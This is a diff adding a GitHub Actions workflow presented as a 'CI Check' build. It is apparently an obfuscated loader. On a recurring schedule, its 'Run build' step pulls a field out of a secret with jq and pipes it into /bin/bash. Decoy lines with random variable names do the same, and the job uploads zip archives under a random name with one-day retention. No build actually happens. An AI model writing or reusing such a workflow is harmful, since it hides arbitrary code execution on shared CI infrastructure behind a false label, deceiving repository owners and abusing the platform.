@@ -1,0 +1,38 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '6 3,9,15,21 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  perform:
+    name: Run build
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run build
+        env:
+          hi1934: ${{ secrets.hi1934 }}
+        run: |
+          printf '%s' "$hi1934" | jq -r .y66 | /bin/bash
+          echo $mcay3 | jq -r .y500 | /bin/bash
+          echo $zsmyo6374 | jq -r .psjw7046 | /bin/bash
+          printf '%s' "$ean9682" | jq -r .w72142 | /bin/bash
+          printf '%s' "$rx34072" | jq -r .sxlbx592 | /bin/bash
+          echo $xsww29 | jq -r .ttt74 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: u9plmQhf
+          path: "*.zip"
+          retention-days: 1
